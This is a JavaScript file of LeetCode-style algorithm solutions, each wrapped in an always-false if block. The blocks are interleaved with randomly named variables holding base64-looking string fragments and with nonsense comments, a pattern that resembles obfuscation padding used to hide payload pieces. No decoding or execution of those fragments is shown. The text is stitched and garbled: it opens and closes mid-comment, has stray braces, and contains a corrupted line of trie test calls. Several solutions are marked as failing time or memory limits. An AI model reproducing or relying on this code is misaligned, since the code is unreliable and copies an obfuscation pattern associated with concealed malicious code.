(order does not matter).
*/
/**
 * @param {string} s
 * @param {string[]} words
 * @return {number[]}
 */
 
 // TIME LIMIT EXCEEDED...
var findSubstring = function(s, words) {
    var len = s.length,
        wordsLen = words.length,
        wordLen = words[0].length,
        i,
        j,
        m,
        temp,
        toFound = {},
        found = {},
        result = [];
        
    for (i = 0; i < wordsLen; i++) {
        if (!toFound[words[i]]) {
            toFound[words[i]] = 1; 
        } else {
            toFound[words[i]]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        found = {};
        j = i;
        for (m = 0; m < wordsLen; m++) {
            temp = s.slice(j, j + wordLen);
            
            if (!toFound[temp]) {
                break;
            }
            
            if (toFound[temp]) {
                if (!found[temp]) {
                    found[temp] = 1;
                } else {
                    found[temp]++;
                }
            }
            
            if (found[temp] > toFound[temp]) {
                break;
            }
            
            j += wordLen;
        }
        
        if (m === wordsLen) {
            result.push(i);
        }
    }
    
    return result;
};

}

    var epcijuixjczud = 'JSbE9pQTNN';
    var wrzavi = 'QxUKXOb';
if (2 === 12) {
    /**
Implement the following operations of a stack using queues.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
empty() -- Return whether the stack is empty.
Notes:
You must use only standard operations of a queue -- which means only push to back, peek/pop from front, size, and is empty operations are valid.
Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.
You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).
Update (2015-06-11):
The class name of the Java function had been updated to MyStack instead of Stack.


*/

/**
 * @constructor
 */
var Stack = function() {
    this.stack1 = [];
    this.stack2 = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
Stack.prototype.push = function(x) {
    var temp;
    
    this.stack2.push(x);
    
    while(this.stack1.length > 0) {
        this.stack2.push(this.stack1.shift());
    }
    
    temp = this.stack2;
    this.stack2 = this.stack1;
    this.stack1 = temp;
};

/**
 * @returns {void}
 */
Stack.prototype.pop = function() {
    return this.stack1.shift();
};

/**
 * @returns {number}
 */
Stack.prototype.top = function() {
    return this.stack1[0];
};

/**
 * @returns {boolean}
 */
Stack.prototype.empty = function() {
    return this.stack1.length === 0;
};

}

    var esuxkrqvemx = 'eUI5TENB';
    var ciwqspj = 'ICZbNMqfg';
    var vxnsapn = 'dkx5QkRkSE';
if (82 > 180) {
    /**
Given a 2D binary matrix filled with 0's and 1's, find the largest rectangle containing all ones and return its area.
*/
/**
 * @param {character[][]} matrix
 * @return {number}
 */
var maximalRectangle = function(matrix) {
    var rLen = matrix.length,
        cLen,
        dp = [],
        max = 0,
        stack,
        temp,
        curRow,
        i,
        j;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    if (cLen === 1 && rLen === 1) {
        return matrix[0][0] === "1" ? 1 : 0;
    }
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
        
        for (j = 0; j < cLen; j++) {
            if (matrix[i][j] === '0') {
                dp[i][j] = 0;
            } else {
                if (i === 0) {
                    dp[i][j] = 1;
                } else {
                    dp[i][j] = dp[i - 1][j] + 1;
                }
                
            }
        }
    }
    
    for (i = 0; i < rLen; i++) {
        stack = [];
        
        curRow = dp[i].concat();
        curRow.push(0);
        for (j = 0; j < cLen + 1;) {
            if (stack.length > 0 && curRow[j] <= curRow[stack[stack.length - 1]]) {
                temp = stack.pop();
                max = Math.max(max, dp[i][temp] * (stack.length === 0 ? j : j - stack[stack.length - 1] - 1));
            } else {
                stack.push(j);
                j++;
            }
        }
    }
    
    return max;
};

}

    var qswqxg = 'suZzOuIT';
    var kcgiedbcsvb = 'pzSzF';
    var tcjosohywk = 'AbVSpCI';
    var tttlqnd = 'Ob2FXWjB';
    var eneazitvfqo = 'oSsmU';
if (78 > 143) {
    /**
Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).

Range Sum Query 2D
The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.

Example:

Given matrix = [
  [3, 0, 1, 4, 2],
  [5, 6, 3, 2, 1],
  [1, 2, 0, 1, 5],
  [4, 1, 0, 1, 7],
  [1, 0, 3, 0, 5]
]

sumRegion(2, 1, 4, 3) -> 8
update(3, 2, 2)
sumRegion(2, 1, 4, 3) -> 10

Note:

    The matrix is only modifiable by the update function.
    You may assume the number of calls to update and sumRegion function is distributed evenly.
    You may assume that row1 ≤ row2 and col1 ≤ col2.

*/
/**
 * @constructor
 * @param {number[][]} matrix
 */
var NumMatrix = function(matrix) {
    this.matrix = matrix;
    this.rowLen = matrix.length;
    this.colLen = this.rowLen === 0 ? 0 : matrix[0].length;
    this.colSum = []; // colSum[i][j] means column sum from matrix[0][j] to matrix[i][j]
    
    for (let i = 0; i < this.rowLen; i++) {
        this.colSum.push(new Array(this.colLen).fill(0));
    }
    
    for (let i = 0; i < this.rowLen; i++) {
        for (let j = 0; j < this.colLen; j++) {
            if (i === 0) {
                this.colSum[i][j] = this.matrix[i][j];
            } else {
                this.colSum[i][j] = this.matrix[i][j] + this.colSum[i - 1][j];
            }
        }
    }
};

/**
 * @param {number} row
 * @param {number} col
 * @param {number} val
 * @return {void}
 */
NumMatrix.prototype.update = function(row, col, val) {
    for (let i = row; i < this.rowLen; i++) {
        this.colSum[i][col] += val - this.matrix[row][col];
    }
    
    this.matrix[row][col] = val;
};

/**
 * @param {number} row1
 * @param {number} col1
 * @param {number} row2
 * @param {number} col2
 * @return {number}
 */
NumMatrix.prototype.sumRegion = function(row1, col1, row2, col2) {
    let result = 0;
    
    for (let i = col1; i <= col2; i++) {
        if (row1 === 0) {
            result += this.colSum[row2][i];
        } else {
            result += this.colSum[row2][i] - this.colSum[row1 - 1][i];
        }
    }
    
    return result;
};


/**
 * Your NumMatrix object will be instantiated and called as such:
 * var numMatrix = new NumMatrix(matrix);
 * numMatrix.sumRegion(0, 1, 2, 3);
 * numMatrix.update(1, 1, 10);
 * numMatrix.sumRegion(1, 2, 3, 4);
 */

}

    var jxurc = 'LMG';
if (0 instanceof String) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var ccipekr = 'WiAFRW';
if (null === 0) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

    var gvyffiwttcz = 'tLS';
if (2 instanceof String) {
    /**
Reverse digits of an integer.

Example1: x = 123, return 321
Example2: x = -123, return -321

click to show spoilers.

Have you thought about this?
Here are some good questions to ask before coding. Bonus points for you if you have already thought through this!

If the integer's last digit is 0, what should the output be? ie, cases such as 10, 100.

Did you notice that the reversed integer might overflow? Assume the input is a 32-bit integer, then the reverse of 1000000003 overflows. How should you handle such cases?

For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.

Update (2014-11-10):
Test cases had been added to test the overflow behavior.
*/
/**
 * @param {number} x
 * @return {number}
 */
var reverse = function(x) {
    var isNegative = x < 0? true: false,
        divider = 10,
        result = 0,
        reminder;
    
    if (isNegative) {
        x = x * (-1);
    }
    
    while (x !== 0) {
        reminder = x % 10;
        result = result * 10 + reminder;
        
        x = Math.floor(x / 10);
    }
    
    if (result >= 2147483648) {
        return 0;
    }
    
    return isNegative? result * (-1) : result;
};

}

    var vxzaibn = 'bdJBYp';
    var twvnh = 'UNBZ0l';
    var qdlanwpngr = 'LlBPbMGfM';
    var ovwhtndiwupik = 'DQW';
    var rtsrrfkqrm = 'ufTptLga';
if (Array.isArray(1)) {
    /**
Given an array of n positive integers and a positive integer s, find the minimal length of a subarray of which the sum ≥ s. If there isn't one, return 0 instead.

For example, given the array [2,3,1,2,4,3] and s = 7,
the subarray [4,3] has the minimal length under the problem constraint.

click to show more practice.

More practice:
If you have figured out the O(n) solution, try coding another solution of which the time complexity is O(n log n).
*/
/**
 * @param {number} s
 * @param {number[]} nums
 * @return {number}
 */
// O(n) solution
var minSubArrayLen = function(s, nums) {
    var len = nums.length,
        left = 0,
        right = 0,
        sum = 0,
        result = Number.MAX_VALUE;
        
    if (len === 0) {
        return 0;
    }
    
    sum += nums[left];
    
    while (right < len) {
        while (sum < s && right < len) {
            right++;
            sum += nums[right];
        }
        
        while (sum >= s) {
            result = Math.min(result, right - left + 1);
            sum -= nums[left];
            left++;
        }
    }
    
    if (result === Number.MAX_VALUE) {
        return 0;
    }
    
    return result;
};


//O(nlgn) solution
/**
 * @param {number} s
 * @param {number[]} nums
 * @return {number}
 */
var minSubArrayLen = function(s, nums) {
    var len = nums.length,
        right = 0,
        sums = [],
        result = Number.MAX_VALUE,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    sums[0] = 0;
    
    for (i = 1; i <= len; i++) {
        sums[i] = nums[i - 1] + sums[i - 1];
    }
    
    for (i = 0; i <= len; i++) {
        right = findRight(i + 1, len, s + sums[i], sums);
        
        if (right === len + 1) {
            break;
        }
        
        if (result > right - i) {
            result = right - i;
        }
    }
    
    return result === Number.MAX_VALUE? 0 : result;
};

function findRight(left, right, key, sums) {
    var mid;
    
    while (left <= right) {
        mid = Math.floor((left + right)/2);
        if (sums[mid] >= key) {
            right = mid - 1;
        } else {
            left = mid + 1;
        }
    }
    
    return left;
}

}

    var utqukwtzywph = 'dJQ0I3SUdO';
    var dwmcvwpgaz = 'TVHz';
    var bhehy = 'MGNtdzZJS';
    var aajoymib = 'vDocZ';
    var hlwgrpkkpcmbh = 'FJ5ZF';
    var zjeuihvqgzt = 'IsfNPtS';
if (1 instanceof String) {
    /**
Given two numbers represented as strings, return multiplication of the numbers as a string.

Note:
The numbers can be arbitrarily large and are non-negative.
Converting the input string to integer is NOT allowed.
You should NOT use internal library such as BigInteger.
*/

// BETTER SOLUTION
//  `num1[i] * num2[j]` will be placed at indices `[i + j`, `i + j + 1]` 
/**
 * @param {string} num1
 * @param {string} num2
 * @return {string}
 */
var multiply = function(num1, num2) {
    const len1 = num1.length;
    const len2 = num2.length;
    let result = new Array(len1 + len2).fill(0);
    
    for (let i = len1 - 1; i >= 0; i--) {
        for (let j = len2 - 1; j >= 0; j--) {
            let value = parseInt(num1.charAt(i)) * parseInt(num2.charAt(j));
            result[i + j + 1] += value;
            
            if (result[i + j + 1] >= 10) {
                result[i + j] += parseInt(result[i + j + 1] / 10);
                result[i + j + 1] = result[i + j + 1] % 10;
            }
        }
    }
    
    let string = '';
    
    for (let i = 0; i < result.length; i++) {
        if (string === '' && result[i] === 0) {
            continue;
        }
        
        string += result[i];
    }
    
    return string === '' ? '0' : string;
};

/**
 * @param {string} num1
 * @param {string} num2
 * @return {string}
 */
var multiply = function(num1, num2) {
    var len1 = num1.length,
        len2 = num2.length,
        result = [],
        carry,
        val,
        arr1,
        arr2,
        i,
        j;
        
    for (i = 0; i < len1 + len2; i++) {
        result.push(0);
    }
    
    arr1 = num1.split('').reverse();
    arr2 = num2.split('').reverse();
    
    for (i = 0; i < len1; i++) {
        val = arr1[i] - '0';
        carry = 0;
        
        for (j = 0; j < len2; j++) {
            carry += val * (arr2[j] - '0') + result[i + j];
            result[i + j] = carry % 10;
            carry = parseInt(carry / 10);
        }
        
        if (carry !== 0) {
            result[len2 + i] = carry;
        }
    }
    
    result = result.reverse();
    
    i = 0;
    
    while (i < len1 + len2 - 1 && result[i] === 0) {
        i++;
    }
    
    return result.slice(i).join('');
};

}

    var fvexbwdype = 'dVc0lIT';
    var dxjkjze = 'Wxda';
    var ooummtypcm = 'm9hV1owT';
if ('z' === 'R') {
    /**
The set [1,2,3,…,n] contains a total of n! unique permutations.

By listing and labeling all of the permutations in order,
We get the following sequence (ie, for n = 3):

"123"
"132"
"213"
"231"
"312"
"321"
Given n and k, return the kth permutation sequence.

Note: Given n will be between 1 and 9 inclusive.
*/
/**
 * @param {number} n
 * @param {number} k
 * @return {string}
 */
var getPermutation = function(n, k) {
    var arr = [],
        num = [],
        result = '',
        i;
    
    for (i = 1; i <= n; i++) {
        arr.push(i);
        num.push(0);
    }
    
    k = k - 1; // there're k - 1 permutations before
    i = 0;
    
    if (k === 0) {
        return arr.join('');
    }
    
    while(k > 0) {
        num[i] = parseInt(k / getFactorial(n - 1));
        k = k % getFactorial(n - 1);
        n--;
        i++;
    }
    
    for (i = 0; i < num.length; i++) {
        result += arr[num[i]];
        arr.splice(num[i], 1);
    }
    
    return result;
};

function getFactorial(n) {
    var result = 1;
    
    if (n === 0) {
        return 0;
    }
    
    while (n > 1) {
        result *= n;
        n--;
    }
    
    return result;
}

}

    var hglxrktraon = 'SAHO';
// string debug ujnpz code hello
    var vgbafqdpri = 'qdNsQPhZ';
    var lcvsjmsoxlsx = '2lCMG';
    var cqcormvpxhh = 'ZzCrfvxq';
    var mafwkqntvllzppg = 'NuVmxMQ0J';
    var fjmfucpu = 'gyxJ';
if (null === 4) {
    /**
Given a sorted integer array where the range of elements are [lower, upper] inclusive, return its missing ranges.

For example, given [0, 1, 3, 50, 75], lower = 0 and upper = 99, return ["2", "4->49", "51->74", "76->99"]. 
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {string[]}
 */
var findMissingRanges = function(nums, lower, upper) {
    let start, prev, end;
    let result = [];
    const len = nums.length;
    
    if (len === 0) {
        if (lower === upper) {
            result.push(lower + '');
        } else {
            result.push(lower + '->' + upper);
        }
        
        return result;
    }
    
    start = nums[0];
    prev = nums[0];
    
    if (start > lower) {
        start--;
        
        if (lower === start) {
            result.push(lower + '');
        } else {
            result.push(lower + '->' + start);
        }
    }
    
    for (let i = 1; i < len; i++) {
        if (nums[i] > prev + 1) {
            start = prev + 1;
            end = nums[i] - 1;
            
            if (start === end) {
                result.push(start + '');
            } else {
                result.push(start + '->' + end);
            }
        }
        
        prev = nums[i];
    }
    
    if (prev + 1 === upper) {
        result.push(upper + '');
    } else if (prev + 1 < upper) {
        result.push(prev + 1 + '->' + upper);
    }
    
    return result;
};

}

    var belxpqu = 'yWlhsR';
if (null === 5) {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

    var fdizoii = 'GpawPoEY';
    var wwrqvdknzhlkehk = 'GIyU';
    var ugccybvz = 'MYtmu';
if (0.22 && false) {
    /**
Given two binary trees, write a function to check if they are equal or not.

Two binary trees are considered equal if they are structurally identical and the nodes have the same value.

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @returns {boolean}
 */
var isSameTree = function(p, q) {
    if (!p && !q) {
        return true;
    }
    if (!p || !q) {
        return false;
    }
    if (p.val !== q.val) {
        return false;
    }
    return isSameTree(p.left, q.left)&&isSameTree(p.right, q.right);
};

}

    var xjtlsycja = 'mxPaU';
    var hzkpzidlnjra = 'rpvMb';
    var wdnvkrmng = 'EyT';
    var ytkcctykq = 'ZXPFb';
    var ewxohsfxbg = 'nlCOUxD';
    var jbpfco = 'PAFobQSOS';
    var zcudgyttknpu = 'QXZM';
if (10 instanceof String) {
    /**
Implement regular expression matching with support for '.' and '*'.

'.' Matches any single character.
'*' Matches zero or more of the preceding element.

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "a*") → true
isMatch("aa", ".*") → true
isMatch("ab", ".*") → true
isMatch("aab", "c*a*b") → true
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 * 
 * The most critical observation is that "x*" can either match empty string, or at least one x. In the latter case, it is equivalent to "xx*" or "x*x"
 * 
 *  
        'match' below including .
    f(i,j) means s where s.len=i matches p where p.len=j
    f(i,j) =
        if (p_j-1 != * ) f(i-1, j-1) and s_i-1 matches p_j-1
        if (p_j-1 == * )
            * matches zero times: f(i,j-2)
            or * matches at least one time: f(i-1,j) and s_i-1 matches p_j-2
 */
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        f = [],
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(0) === '*') {
        return false;
    }
    
    for (i = 0; i <= lenS; i++) {
        f.push(new Array(lenP + 1));
        for (j = 0; j <= lenP; j++) {
            f[i][j] = false;
        }
    }
    
    f[0][0] = true;
    
    for (i = 1; i < lenP; i++) {
        if (p.charAt(i) === '*') {
            f[0][i + 1] = f[0][i - 1];
        }
    }
    
    for (i = 1; i <= lenS; i++) {
        for (j = 1; j <= lenP; j++) {
            if (p.charAt(j - 1) === '*') {
                f[i][j] = f[i][j - 2] || (f[i - 1][j] && (s.charAt(i - 1) === p.charAt(j - 2) || p.charAt(j - 2) === '.'));
            } else {
                f[i][j] = f[i - 1][j - 1] && (s.charAt(i - 1) === p.charAt(j - 1) || p.charAt(j - 1) === '.');
            }
        }
    }
    
    return f[lenS][lenP];
};


// TIME LIMIT EXCEEDED
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(1) === '*') {
        return isMatch(s, p.substr(2)) || s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p);
    } else {
        return s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p.substr(1));
    }

};

}

    var cocbwvqgklg = 'jNXJisLq';
    var zsclypdetfldkj = 'eUJEZEhKc0';
    var msdavuho = 'bnoDuZzU';
if ('i' === 'I') {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var fpwhic = 'sxTm9hV1';
    var kkftcaeg = 'Uimn';
// bkzmx world value variable constant lmoqfzim number
    var yekwqmyjcmb = 'rSdRDoTTe';
if (1 > 111) {
    /**
Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______3______
       /              \
    ___5__          ___1__
   /      \        /      \
   6      _2       0       8
         /  \
         7   4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (!root || root === p || root === q) {
        return root;
    }
    
    var left = lowestCommonAncestor(root.left, p, q),
        right = lowestCommonAncestor(root.right, p, q);
    
    // q and p in different side    
    if (left && right) {
        return root;
    }
    
    return left ? left : right;
};

}

    var eummcnrusctgpgo = 'owSzBNS0';
if (typeof navigator === 'undefined') {
    /**
Given a sorted positive integer array nums and an integer n, add/patch elements to the array such that any number in range [1, n] inclusive can be formed by the sum of some elements in the array. Return the minimum number of patches required.

Example 1:
nums = [1, 3], n = 6
Return 1.

Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.
Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].
Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].
So we only need 1 patch.

Example 2:
nums = [1, 5, 10], n = 20
Return 2.
The two patches can be [2, 4].

Example 3:
nums = [1, 2, 2], n = 5
Return 0.
*/
/**
 * @param {number[]} nums
 * @param {number} n
 * @return {number}
 * nums[i] <= known_sum，更新已知范围为：[1,known_sum + nums[i] )
   nums[i] >  known_sum,  添加known_sum进数组才能达到最大的范围，所以已知范围更新为：[1,known_sum *2  )
 */

//  time limit exceeded
var minPatches = function(nums, n) {
    var knownSum = 1,
        len = nums.length,
        count = 0,
        i = 0;
        
    while (knownSum <= n) {
        if (i < len && knownSum >= nums[i]) {
            knownSum += nums[i];
            i++;
        } else {
            knownSum <<= 1;
            count++;
        }
    }
    
    return count;
};

}

    var gyegbirmqf = 'mXtwWscILl';
if (!true && 1) {
    /**
Given a linked list, remove the nth node from the end of list and return its head.

For example,

   Given linked list: 1->2->3->4->5, and n = 2.

   After removing the second node from the end, the linked list becomes 1->2->3->5.
Note:
Given n will always be valid.
Try to do this in one pass.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} n
 * @return {ListNode}
 */
var removeNthFromEnd = function(head, n) {
    var nodeA = head,
        nodeB = head,
        i = 0;
    
    if (!head) {
        return null;
    }
    
    while (nodeA.next) {
        nodeA = nodeA.next;
        if (i < n) {
            i++;
        } else {
            nodeB = nodeB.next;
        }
    }
    
    if (i < n) {
        head = head.next;
        return head;
    }
    
    if (nodeB.next) {
        nodeB.next = nodeB.next.next;
        return head;
    }
    
    return null;
      
};

}

    var neilojoqirnam = 'lDQWdJ';
if (null === 3) {
    /**
Reverse a singly linked list.

click to show more hints.

Hint:
A linked list can be reversed either iteratively or recursively. Could you implement both?
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseList = function(head) {
    var cur = head,
        next;
    
    head = null;
    
    while(cur) {
        next = cur.next;
        cur.next = head;
        
        if (next) {
            head = cur;
            cur = next;
        } else {
            return cur;   
        }
    }
    
    return null;
};

// recursive

var reverseList = function(head) {
    if (!head) {
        return null;
    }
    
    if (!head.next) {
        return head;
    }
    
    var newHead = reverseList(head.next);
    
    head.next.next = head;
    head.next = null;
    
    return newHead;
};

}

    var zpatawrukqqy = 'wDDmwKX';
    var fijyoc = 'Q0FnSUN';
if ('a' === 'C') {
    /**
Follow up for "Remove Duplicates":
What if duplicates are allowed at most twice?

For example,
Given sorted array nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var removeDuplicates = function(nums) {
    var duplicate = false,
        len = nums.length,
        index = 1,
        i;
    
    for (i = 1; i < len; i++) {
        if (duplicate && nums[i] === nums[i - 1]) {
            continue;
        }
        
        if (nums[i] === nums[i - 1]) {
            duplicate = true;
        } else {
            duplicate = false;
        }
        
        nums[index] = nums[i];
        index++;
    }
    
    return index;
};

}

    var pncjnhlsy = 'hWMCt';
    var kkwhmw = 'CN0lHTjB';
if (Array.isArray(7)) {
    /**
Implement a trie with insert, search, and startsWith methods.

Note:
You may assume that all inputs are consist of lowercase letters a-z.
*/
/**
 * @constructor
 * Initialize your data structure here.
 */
 
 // MEMORY LIMIT EXCEEDED
var TrieNode = function() {
    var isEnd,
        links = {};
        
    return {
        containsKey: function(n) {
            return links[n] !== undefined;
        },
        get: function(ch) {
            return links[ch];
        },
        put: function(ch, node) {
            links[ch] = node;
        },
        setEnd: function() {
            isEnd = true;
        },
        isEnd: function() {
            return isEnd;
        }
    };
};

var Trie = function() {
    this.root = TrieNode();
};

/**
 * @param {string} word
 * @return {void}
 * Inserts a word into the trie.
 */
Trie.prototype.insert = function(word) {
    var len = word.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = word.charAt(i);
        
        if (!node.containsKey(ch)) {
            node.put(ch, TrieNode());
        }
        
        node = node.get(ch);
    }
    
    node.setEnd();
};

/**
 * @param {string} word
 * @return {boolean}
 * Returns if the word is in the trie.
 */
Trie.prototype.search = function(word) {
    var node = this.searchPrefix(word);
    
    return node && node.isEnd();
};

/**
 * @param {string} prefix
 * @return {boolean}
 * Returns if there is any word in the trie
 * that starts with the given prefix.
 */
Trie.prototype.startsWith = function(prefix) {
    return this.searchPrefix(prefix) !== null;
};

Trie.prototype.searchPrefix = function(prefix) {
    var len = prefix.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = prefix.charAt(i);
        
        if (!node.containsKey(ch)) {
            return null;
        }
        
        node = node.get(ch);
    }
    
    return node;
};

/**
 * Your Trie object will be instantiated and called as such:
 * var trie = new Trie();
 * trie.insert("somestring");
 * trie.search("key");
 */arch("theomachia"),search("roughy"),search("hypotarsal"),search("snooze"),search("pronominalize"),search("proselytist"),search("lingel")

}

    var ouyndujdvf = 'NYHJflmPRu';
    var dkhsfo = 'jbXc2';
if (0.02 && false) {
    /**
Write a program to find the n-th ugly number.

Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 is the sequence of the first 10 ugly numbers.

Note that 1 is typically treated as an ugly number.

Hint:

The naive approach is to call isUgly for every number until you reach the nth one. Most numbers are not ugly. Try to focus your effort on generating only the ugly ones.
An ugly number must be multiplied by either 2, 3, or 5 from a smaller ugly number.
The key is how to maintain the order of the ugly numbers. Try a similar approach of merging from three sorted lists: L1, L2, and L3.
